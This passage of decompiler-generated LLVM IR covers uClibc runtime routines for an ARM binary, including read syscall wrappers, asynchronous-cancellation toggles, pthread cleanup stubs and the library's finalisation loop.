  store i32 %v15_1586c, i32* %stack_var_-8, align 4
  %v18_1586c = load i32, i32* @lr, align 4
  %v0_15870 = call i32 @__libc_enable_asynccancel()
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_1586c, i32* @r3, align 4
  store i32 %v3_1586c, i32* @r7, align 4
  %v1_1588c = call i32 @__libc_disable_asynccancel(i32 %v0_15870)
  %v0_15890 = load i32, i32* @r7, align 4
  store i32 %v0_15890, i32* @r0, align 4
  %v2_15894 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15894, i32* @r7, align 4
  store i32 %v18_1586c, i32* @lr, align 4
  %v2_15898 = icmp ugt i32 %v0_15890, -4097
  %v7_15898 = icmp eq i32 %v0_15890, -4096
  store i1 %v7_15898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15898, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1586c
  %v0_158a0 = call i32 @__syscall_error()
  %v0_158b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_158b0, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_158b0 = load i32, i32* @r1, align 4
  %v2_158b0 = load i32, i32* @r4, align 4
  %v5_158b0 = mul i32 %v2_158b0, 134217728
  %v6_158b0 = and i32 %v5_158b0, %v1_158b0
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_15890, { 0, 2, 3, 1 }
  uselistorder i32 %v0_15860, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1586c, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_158c4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_158c4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_158c4 = load i32, i32* @r0, align 4
  ret i32 %v2_158c4

bb1:                                              ; preds = %entry
  %v0_158c8 = call i32 @__syscall_error()
  ret i32 %v0_158c8

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_158d4 = load i32, i32* @global_var_26660.663, align 4
  %v2_158d8 = icmp eq i32 %v3_158d4, 0
  br i1 %v2_158d8, label %dec_label_pc_158e0, label %entry.dec_label_pc_158fc_crit_edge

entry.dec_label_pc_158fc_crit_edge:               ; preds = %entry
  %v3_158fc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_158fc

dec_label_pc_158e0:                               ; preds = %entry
  %v0_158f0 = load i32, i32* @r0, align 4
  %v2_158f0 = icmp ugt i32 %v0_158f0, -4097
  br i1 %v2_158f0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_158fc, %dec_label_pc_158e0
  %merge = phi i32 [ %v0_158f0, %dec_label_pc_158e0 ], [ %v0_15920, %dec_label_pc_158fc ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_158e0
  %v0_158f8 = call i32 @__syscall_error()
  br label %dec_label_pc_158fc

dec_label_pc_158fc:                               ; preds = %entry.dec_label_pc_158fc_crit_edge, %bb8
  %v3_158fc = phi i32 [ %v3_158fc.pre, %entry.dec_label_pc_158fc_crit_edge ], [ %v0_158f8, %bb8 ]
  %v6_158fc = load i32, i32* @r1, align 4
  %v15_158fc = load i32, i32* @r7, align 4
  store i32 %v15_158fc, i32* %stack_var_-8, align 4
  %v18_158fc = load i32, i32* @lr, align 4
  %v0_15900 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_158fc, i32* @r1, align 4
  store i32 %v3_158fc, i32* @r7, align 4
  %v1_1591c = call i32 @__libc_disable_asynccancel(i32 %v0_15900)
  %v0_15920 = load i32, i32* @r7, align 4
  store i32 %v0_15920, i32* @r0, align 4
  %v2_15924 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15924, i32* @r7, align 4
  store i32 %v18_158fc, i32* @lr, align 4
  %v2_15928 = icmp ugt i32 %v0_15920, -4097
  br i1 %v2_15928, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_158fc
  %v0_15930 = call i32 @__syscall_error()
  ret i32 %v0_15930

; uselistorder directives
  uselistorder i32 %v0_15920, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_158fc, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_15940 = load i32, i32* %r0.global-to-local, align 4
  %v1_15940 = and i32 %v0_15940, 2
  %v2_15940 = icmp eq i32 %v1_15940, 0
  %v3_15944 = load i32, i32* @r4, align 4
  store i32 %v3_15944, i32* %stack_var_-16, align 4
  br i1 %v2_15940, label %dec_label_pc_1594c, label %dec_label_pc_159c0

dec_label_pc_1594c:                               ; preds = %entry
  %v0_1594c = call i32 @__aeabi_read_tp()
  store i32 %v0_1594c, i32* %r0.global-to-local, align 4
  %v1_15950 = add i32 %v0_1594c, -1036
  %v2_15950 = inttoptr i32 %v1_15950 to i32*
  %v3_15950 = load i32, i32* %v2_15950, align 4
  %v1_15954 = add i32 %v0_1594c, -1168
  store i32 %v1_15954, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15958

dec_label_pc_15958:                               ; preds = %dec_label_pc_1598c.dec_label_pc_15958_crit_edge, %dec_label_pc_1594c
  %v0_15964 = phi i32 [ %v0_15964.pre, %dec_label_pc_1598c.dec_label_pc_15958_crit_edge ], [ %v1_15954, %dec_label_pc_1594c ]
  %v0_15958 = phi i32 [ %v0_1598c, %dec_label_pc_1598c.dec_label_pc_15958_crit_edge ], [ %v3_15950, %dec_label_pc_1594c ]
  %v1_15958 = and i32 %v0_15958, -3
  store i32 %v1_15958, i32* %r7.global-to-local, align 4
  store i32 %v0_15958, i32* %r4.global-to-local, align 4
  store i32 %v1_15958, i32* @r1, align 4
  %v1_15964 = add i32 %v0_15964, 132
  store i32 %v1_15964, i32* @r2, align 4
  %v1_1596823 = inttoptr i32 %v1_15964 to i32*
  %v2_1596824 = load i32, i32* %v1_1596823, align 4
  %v3_1596c26 = icmp uge i32 %v2_1596824, %v0_15958
  store i1 %v3_1596c26, i1* %cpsr_c.global-to-local, align 1
  %v9_1596c32 = icmp eq i32 %v2_1596824, %v0_15958
  br i1 %v9_1596c32, label %dec_label_pc_15974, label %dec_label_pc_1598c

dec_label_pc_15974:                               ; preds = %dec_label_pc_15958, %dec_label_pc_15974.dec_label_pc_15968_crit_edge
  %v0_1597433 = phi i32 [ %v1_1596c.pre, %dec_label_pc_15974.dec_label_pc_15968_crit_edge ], [ %v0_15958, %dec_label_pc_15958 ]
  store i32 %v0_1597433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15984 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15984, label %dec_label_pc_15988, label %dec_label_pc_15974.dec_label_pc_15968_crit_edge

dec_label_pc_15974.dec_label_pc_15968_crit_edge:  ; preds = %dec_label_pc_15974
  %v0_15968.pre = load i32, i32* @r2, align 4
  %v1_1596c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15968 = inttoptr i32 %v0_15968.pre to i32*
  %v2_15968 = load i32, i32* %v1_15968, align 4
  %v3_1596c = icmp uge i32 %v2_15968, %v1_1596c.pre
  store i1 %v3_1596c, i1* %cpsr_c.global-to-local, align 1
  %v9_1596c = icmp eq i32 %v2_15968, %v1_1596c.pre
  br i1 %v9_1596c, label %dec_label_pc_15974, label %dec_label_pc_1598c

dec_label_pc_15988:                               ; preds = %dec_label_pc_15974
  %v0_15988 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1598c

dec_label_pc_1598c:                               ; preds = %dec_label_pc_15958, %dec_label_pc_15974.dec_label_pc_15968_crit_edge, %dec_label_pc_15988
  %v0_1598c = phi i32 [ %v0_15988, %dec_label_pc_15988 ], [ %v2_1596824, %dec_label_pc_15958 ], [ %v2_15968, %dec_label_pc_15974.dec_label_pc_15968_crit_edge ]
  %v1_1598c = phi i32 [ %v0_15988, %dec_label_pc_15988 ], [ %v0_15958, %dec_label_pc_15958 ], [ %v1_1596c.pre, %dec_label_pc_15974.dec_label_pc_15968_crit_edge ]
  %v3_1598c = icmp uge i32 %v0_1598c, %v1_1598c
  store i1 %v3_1598c, i1* %cpsr_c.global-to-local, align 1
  %v9_1598c = icmp eq i32 %v0_1598c, %v1_1598c
  br i1 %v9_1598c, label %dec_label_pc_159b4.preheader, label %dec_label_pc_1598c.dec_label_pc_15958_crit_edge

dec_label_pc_1598c.dec_label_pc_15958_crit_edge:  ; preds = %dec_label_pc_1598c
  %v0_15964.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15958

dec_label_pc_159b4.preheader:                     ; preds = %dec_label_pc_1598c
  %v0_159b41 = load i32, i32* %r7.global-to-local, align 4
  %v1_159b42 = and i32 %v0_159b41, 12
  store i32 %v1_159b42, i32* @r3, align 4
  %v2_159b83 = icmp ugt i32 %v1_159b42, 3
  store i1 %v2_159b83, i1* %cpsr_c.global-to-local, align 1
  %v7_159b85 = icmp eq i32 %v1_159b42, 4
  br i1 %v7_159b85, label %dec_label_pc_15998.lr.ph, label %dec_label_pc_159b4.preheader.dec_label_pc_159c0.loopexit_crit_edge

dec_label_pc_159b4.preheader.dec_label_pc_159c0.loopexit_crit_edge: ; preds = %dec_label_pc_159b4.preheader
  %v1_159c4.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_159c0.loopexit

dec_label_pc_15998.lr.ph:                         ; preds = %dec_label_pc_159b4.preheader
  %v0_1599c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_1599c = add i32 %v0_1599c.pre, 132
  %v2_159b0 = inttoptr i32 %v1_1599c to i32*
  br label %dec_label_pc_15998

dec_label_pc_15998:                               ; preds = %dec_label_pc_15998.lr.ph, %dec_label_pc_15998
  %v0_15998 = phi i32 [ %v0_159b41, %dec_label_pc_15998.lr.ph ], [ %v3_159b0, %dec_label_pc_15998 ]
  store i32 %v0_15998, i32* @r2, align 4
  store i32 %v1_1599c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_159b0 = load i32, i32* %v2_159b0, align 4
  store i32 %v3_159b0, i32* %r7.global-to-local, align 4
  %v1_159b4 = and i32 %v3_159b0, 12
  store i32 %v1_159b4, i32* @r3, align 4
  %v7_159b8 = icmp eq i32 %v1_159b4, 4
  br i1 %v7_159b8, label %dec_label_pc_15998, label %dec_label_pc_159b4.dec_label_pc_159c0.loopexit_crit_edge

dec_label_pc_159b4.dec_label_pc_159c0.loopexit_crit_edge: ; preds = %dec_label_pc_15998
  %v2_159b8 = icmp ugt i32 %v1_159b4, 3
  store i1 %v2_159b8, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_159c0.loopexit

dec_label_pc_159c0.loopexit:                      ; preds = %dec_label_pc_159b4.preheader.dec_label_pc_159c0.loopexit_crit_edge, %dec_label_pc_159b4.dec_label_pc_159c0.loopexit_crit_edge
  %v1_159c4.pre = phi i32 [ %v1_159c4.pre.pre, %dec_label_pc_159b4.preheader.dec_label_pc_159c0.loopexit_crit_edge ], [ %v1_1599c, %dec_label_pc_159b4.dec_label_pc_159c0.loopexit_crit_edge ]
  %v2_159c0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_159c0

dec_label_pc_159c0:                               ; preds = %dec_label_pc_159c0.loopexit, %entry
  %v1_159c4 = phi i32 [ %v1_159c4.pre, %dec_label_pc_159c0.loopexit ], [ %v0_15940, %entry ]
  %v2_159c0 = phi i32 [ %v2_159c0.pre, %dec_label_pc_159c0.loopexit ], [ %v3_15944, %entry ]
  store i32 %v2_159c0, i32* @r4, align 4
  ret i32 %v1_159c4

; uselistorder directives
  uselistorder i32 %v3_159b0, { 1, 2, 0 }
  uselistorder i32 %v1_1599c, { 0, 2, 1 }
  uselistorder i32 %v0_15988, { 1, 0 }
  uselistorder i32 %v1_1596c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15958, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 0, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_159c0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_15998, { 1, 0 }
  uselistorder label %dec_label_pc_1598c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15974, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_159c8 = load i32, i32* @r4, align 4
  store i32 %v3_159c8, i32* %stack_var_-24, align 4
  store i32 55700, i32* %r8.global-to-local, align 4
  %v0_159d0 = call i32 @__aeabi_read_tp()
  %v1_159d4 = add i32 %v0_159d0, -1036
  %v2_159d4 = inttoptr i32 %v1_159d4 to i32*
  %v3_159d4 = load i32, i32* %v2_159d4, align 4
  store i32 %v3_159d4, i32* %r6.global-to-local, align 4
  %v1_159d8 = add i32 %v0_159d0, -1168
  store i32 %v1_159d8, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r8.global-to-local, align 4
  %v1_159e046 = or i32 %v3_159d4, 2
  store i32 %v1_159e046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_159e449 = icmp eq i32 %v1_159e046, %v3_159d4
  br i1 %v9_159e449, label %dec_label_pc_15a90, label %dec_label_pc_159ec

dec_label_pc_159ec:                               ; preds = %entry, %bb.dec_label_pc_159ec_crit_edge
  %v0_159f0 = phi i32 [ %v0_159f0.pre, %bb.dec_label_pc_159ec_crit_edge ], [ %v1_159d8, %entry ]
  %v1_159e051 = phi i32 [ %v1_159e0, %bb.dec_label_pc_159ec_crit_edge ], [ %v1_159e046, %entry ]
  %v0_159f450 = phi i32 [ %v1_15a20, %bb.dec_label_pc_159ec_crit_edge ], [ %v3_159d4, %entry ]
  store i32 %v1_159e051, i32* @r1, align 4
  %v1_159f0 = add i32 %v0_159f0, 132
  store i32 %v1_159f0, i32* %r2.global-to-local, align 4
  store i32 %v0_159f450, i32* %r4.global-to-local, align 4
  %v1_159f834 = inttoptr i32 %v1_159f0 to i32*
  %v2_159f835 = load i32, i32* %v1_159f834, align 4
  store i32 %v2_159f835, i32* @r3, align 4
  %v3_159fc37 = icmp uge i32 %v2_159f835, %v0_159f450
  store i1 %v3_159fc37, i1* %cpsr_c.global-to-local, align 1
  %v9_159fc43 = icmp eq i32 %v2_159f835, %v0_159f450
  br i1 %v9_159fc43, label %dec_label_pc_15a04, label %dec_label_pc_15a1c

dec_label_pc_15a04:                               ; preds = %dec_label_pc_159ec, %dec_label_pc_15a04.dec_label_pc_159f8_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_15a14 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15a14, label %dec_label_pc_15a18, label %dec_label_pc_15a04.dec_label_pc_159f8_crit_edge

dec_label_pc_15a04.dec_label_pc_159f8_crit_edge:  ; preds = %dec_label_pc_15a04
  %v0_159f8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_159fc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_159f8 = inttoptr i32 %v0_159f8.pre to i32*
  %v2_159f8 = load i32, i32* %v1_159f8, align 4
  store i32 %v2_159f8, i32* @r3, align 4
  %v3_159fc = icmp uge i32 %v2_159f8, %v1_159fc.pre
  store i1 %v3_159fc, i1* %cpsr_c.global-to-local, align 1
  %v9_159fc = icmp eq i32 %v2_159f8, %v1_159fc.pre
  br i1 %v9_159fc, label %dec_label_pc_15a04, label %dec_label_pc_15a1c

dec_label_pc_15a18:                               ; preds = %dec_label_pc_15a04
  %v0_15a18 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15a18, i32* @r3, align 4
  br label %dec_label_pc_15a1c

dec_label_pc_15a1c:                               ; preds = %dec_label_pc_159ec, %dec_label_pc_15a04.dec_label_pc_159f8_crit_edge, %dec_label_pc_15a18
  %v1_15a20 = phi i32 [ %v0_15a18, %dec_label_pc_15a18 ], [ %v2_159f835, %dec_label_pc_159ec ], [ %v2_159f8, %dec_label_pc_15a04.dec_label_pc_159f8_crit_edge ]
  %v1_15a1c = load i32, i32* %r6.global-to-local, align 4
  %v3_15a1c = icmp uge i32 %v1_15a20, %v1_15a1c
  store i1 %v3_15a1c, i1* %cpsr_c.global-to-local, align 1
  %v9_15a1c = icmp eq i32 %v1_15a20, %v1_15a1c
  br i1 %v9_15a1c, label %dec_label_pc_15a28, label %bb

bb:                                               ; preds = %dec_label_pc_15a1c
  store i32 %v1_15a20, i32* %r6.global-to-local, align 4
  %v1_159e0 = or i32 %v1_15a20, 2
  store i32 %v1_159e0, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_159e4 = icmp eq i32 %v1_159e0, %v1_15a20
  br i1 %v9_159e4, label %dec_label_pc_15a90, label %bb.dec_label_pc_159ec_crit_edge

bb.dec_label_pc_159ec_crit_edge:                  ; preds = %bb
  %v0_159f0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_159ec

dec_label_pc_15a28:                               ; preds = %dec_label_pc_15a1c
  %v0_15a28 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a28 = and i32 %v0_15a28, -69
  store i32 %v1_15a28, i32* @r3, align 4
  %v2_15a2c = icmp ugt i32 %v1_15a28, 9
  store i1 %v2_15a2c, i1* %cpsr_c.global-to-local, align 1
  %v7_15a2c = icmp eq i32 %v1_15a28, 10
  br i1 %v7_15a2c, label %dec_label_pc_15a34, label %dec_label_pc_15a90

dec_label_pc_15a34:                               ; preds = %dec_label_pc_15a28
  %v1_15a38 = load i32, i32* %r7.global-to-local, align 4
  %v2_15a38 = add i32 %v1_15a38, 544
  %v3_15a38 = inttoptr i32 %v2_15a38 to i32*
  store i32 -1, i32* %v3_15a38, align 4
  %v0_15a3c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_15a3c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15a40

dec_label_pc_15a40:                               ; preds = %dec_label_pc_15a74.dec_label_pc_15a40_crit_edge, %dec_label_pc_15a34
  %v0_15a44 = phi i32 [ %v0_15a44.pre, %dec_label_pc_15a74.dec_label_pc_15a40_crit_edge ], [ %v0_15a3c, %dec_label_pc_15a34 ]
  %v0_15a40 = load i32, i32* %r7.global-to-local, align 4
  %v1_15a40 = add i32 %v0_15a40, 132
  %v2_15a40 = inttoptr i32 %v1_15a40 to i32*
  %v3_15a40 = load i32, i32* %v2_15a40, align 4
  store i32 %v0_15a44, i32* %r2.global-to-local, align 4
  store i32 %v3_15a40, i32* %r4.global-to-local, align 4
  %v1_15a4c = or i32 %v3_15a40, 16
  store i32 %v1_15a4c, i32* @r1, align 4
  %v1_15a5022 = inttoptr i32 %v0_15a44 to i32*
  %v2_15a5023 = load i32, i32* %v1_15a5022, align 4
  %v3_15a5425 = icmp uge i32 %v2_15a5023, %v3_15a40
  store i1 %v3_15a5425, i1* %cpsr_c.global-to-local, align 1
  %v9_15a5431 = icmp eq i32 %v2_15a5023, %v3_15a40
  br i1 %v9_15a5431, label %dec_label_pc_15a5c, label %dec_label_pc_15a74

dec_label_pc_15a5c:                               ; preds = %dec_label_pc_15a40, %dec_label_pc_15a5c.dec_label_pc_15a50_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_15a6c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15a6c, label %dec_label_pc_15a70, label %dec_label_pc_15a5c.dec_label_pc_15a50_crit_edge

dec_label_pc_15a5c.dec_label_pc_15a50_crit_edge:  ; preds = %dec_label_pc_15a5c
  %v0_15a50.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15a54.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15a50 = inttoptr i32 %v0_15a50.pre to i32*
  %v2_15a50 = load i32, i32* %v1_15a50, align 4
  %v3_15a54 = icmp uge i32 %v2_15a50, %v1_15a54.pre
  store i1 %v3_15a54, i1* %cpsr_c.global-to-local, align 1
  %v9_15a54 = icmp eq i32 %v2_15a50, %v1_15a54.pre
  br i1 %v9_15a54, label %dec_label_pc_15a5c, label %dec_label_pc_15a74

dec_label_pc_15a70:                               ; preds = %dec_label_pc_15a5c
  %v0_15a70 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15a74

dec_label_pc_15a74:                               ; preds = %dec_label_pc_15a40, %dec_label_pc_15a5c.dec_label_pc_15a50_crit_edge, %dec_label_pc_15a70
  %v0_15a74 = phi i32 [ %v0_15a70, %dec_label_pc_15a70 ], [ %v2_15a5023, %dec_label_pc_15a40 ], [ %v2_15a50, %dec_label_pc_15a5c.dec_label_pc_15a50_crit_edge ]
  %v1_15a74 = phi i32 [ %v0_15a70, %dec_label_pc_15a70 ], [ %v3_15a40, %dec_label_pc_15a40 ], [ %v1_15a54.pre, %dec_label_pc_15a5c.dec_label_pc_15a50_crit_edge ]
  %v3_15a74 = icmp uge i32 %v0_15a74, %v1_15a74
  store i1 %v3_15a74, i1* %cpsr_c.global-to-local, align 1
  %v9_15a74 = icmp eq i32 %v0_15a74, %v1_15a74
  br i1 %v9_15a74, label %dec_label_pc_15a7c, label %dec_label_pc_15a74.dec_label_pc_15a40_crit_edge

dec_label_pc_15a74.dec_label_pc_15a40_crit_edge:  ; preds = %dec_label_pc_15a74
  %v0_15a44.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15a40

dec_label_pc_15a7c:                               ; preds = %dec_label_pc_15a74
  store i32 116, i32* @r3, align 4
  %v0_15a84 = load i32, i32* %r8.global-to-local, align 4
  %v2_15a84 = add i32 %v0_15a84, 116
  %v3_15a84 = inttoptr i32 %v2_15a84 to i32*
  %v4_15a84 = load i32, i32* %v3_15a84, align 4
  store i32 %v4_15a84, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_15a84)
  %v0_15a90.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15a90

dec_label_pc_15a90:                               ; preds = %entry, %bb, %dec_label_pc_15a28, %dec_label_pc_15a7c
  %v0_15a90 = phi i32 [ %v1_15a20, %dec_label_pc_15a28 ], [ %v0_15a90.pre, %dec_label_pc_15a7c ], [ %v3_159d4, %entry ], [ %v1_15a20, %bb ]
  %v2_15a94 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15a94, i32* @r4, align 4
  ret i32 %v0_15a90

; uselistorder directives
  uselistorder i32 %v0_15a70, { 1, 0 }
  uselistorder i32 %v1_15a54.pre, { 0, 2, 1 }
  uselistorder i32 %v1_159e0, { 1, 2, 0 }
  uselistorder i32 %v1_15a1c, { 1, 0 }
  uselistorder i32 %v1_15a20, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_159fc.pre, { 1, 0 }
  uselistorder i32 %v0_159f450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 1, 2 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15a90, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_15a74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15a5c, { 1, 0 }
  uselistorder label %dec_label_pc_15a1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15a04, { 1, 0 }
  uselistorder label %dec_label_pc_159ec, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_15ab4 = add i32 %tmp, 4
  %v4_15ab4 = inttoptr i32 %v3_15ab4 to i32*
  store i32 %arg3, i32* %v4_15ab4, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_15ac0 = icmp eq i32 %arg2, 0
  br i1 %v2_15ac0, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_15acc = add i32 %tmp, 4
  %v3_15acc = inttoptr i32 %v2_15acc to i32*
  %v4_15acc = load i32, i32* %v3_15acc, align 4
  store i32 %v4_15acc, i32* %r0.global-to-local, align 4
  %v3_15ad0 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_15ad0, %bb ], [ undef, %entry ]
  %v2_15ad8 = xor i1 %v2_15ac0, true
  call void @__pseudo_cond_branch(i1 %v2_15ad8, i32 %.02)
  %v1_15ae4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15ae4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_15b0c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15ae8 = load i32, i32* @r4, align 4
  store i32 %v3_15ae8, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15b0c

dec_label_pc_15b0c:                               ; preds = %dec_label_pc_15b0c.dec_label_pc_15b0c_crit_edge, %dec_label_pc_15b0c.lr.ph
  %v1_15b0c = phi i32 [ %v1_15b18, %dec_label_pc_15b0c.dec_label_pc_15b0c_crit_edge ], [ 0, %dec_label_pc_15b0c.lr.ph ]
  %v0_15b0c = phi i32 [ %v0_15b0c.pre, %dec_label_pc_15b0c.dec_label_pc_15b0c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 -8), %dec_label_pc_15b0c.lr.ph ]
  %v4_15b0c = mul i32 %v1_15b0c, 4
  %v5_15b0c = add i32 %v4_15b0c, %v0_15b0c
  %v6_15b0c = inttoptr i32 %v5_15b0c to i32*
  %v7_15b0c = load i32, i32* %v6_15b0c, align 4
  call void @__pseudo_branch(i32 %v7_15b0c)
  %v0_15b18 = load i32, i32* %r4.global-to-local, align 4
  %v1_15b18 = add i32 %v0_15b18, -1
  store i32 %v1_15b18, i32* %r4.global-to-local, align 4
  %v2_15b18 = icmp eq i32 %v0_15b18, 0
  br i1 %v2_15b18, label %dec_label_pc_15b20, label %dec_label_pc_15b0c.dec_label_pc_15b0c_crit_edge

dec_label_pc_15b0c.dec_label_pc_15b0c_crit_edge:  ; preds = %dec_label_pc_15b0c
  %v0_15b0c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15b0c

dec_label_pc_15b20:                               ; preds = %dec_label_pc_15b0c
  %v0_15b24.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_15b24 = add i32 %v0_15b24.pre, 2008
  %v3_15b24 = inttoptr i32 %v2_15b24 to i32*
  %v4_15b24 = load i32, i32* %v3_15b24, align 4
  %v2_15b28 = icmp eq i32 %v4_15b24, 0
  br i1 %v2_15b28, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_15b20
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_15b20, %bb
  %v2_15b30 = xor i1 %v2_15b28, true
  call void @__pseudo_cond_branch(i1 %v2_15b30, i32 %v4_15b24)
  %v0_15b38 = load i32, i32* %r5.global-to-local, align 4
  %v2_15b38 = add i32 %v0_15b38, 2012
  %v3_15b38 = inttoptr i32 %v2_15b38 to i32*
  %v4_15b38 = load i32, i32* %v3_15b38, align 4
  %v2_15b3c = icmp eq i32 %v4_15b38, 0
  br i1 %v2_15b3c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_15b44 = xor i1 %v2_15b3c, true
